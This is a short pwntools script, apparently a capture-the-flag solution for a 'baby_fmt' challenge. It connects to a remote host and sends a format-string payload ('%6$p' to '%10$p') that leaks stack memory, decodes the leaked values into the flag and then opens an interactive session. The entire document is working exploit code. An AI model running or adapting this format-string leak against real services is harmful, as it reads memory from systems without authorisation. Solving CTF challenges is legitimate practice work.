from pwn import *

ip = "140.110.112.77"
port = 4001

context.arch = "amd64"

r = remote(ip, port)
# r = process("./baby_fmt")

payload = ".".join([f"%{x}$p" for x in range(6, 11)])
r.sendlineafter(":D", payload)

r.recvuntil(":")
flag = list(map(lambda x: int(x, 16), r.recvline()[:-1].split(b".")))
print(b"".join(list(map(lambda x: int.to_bytes(x, 8, 'little'), flag))))

r.interactive()
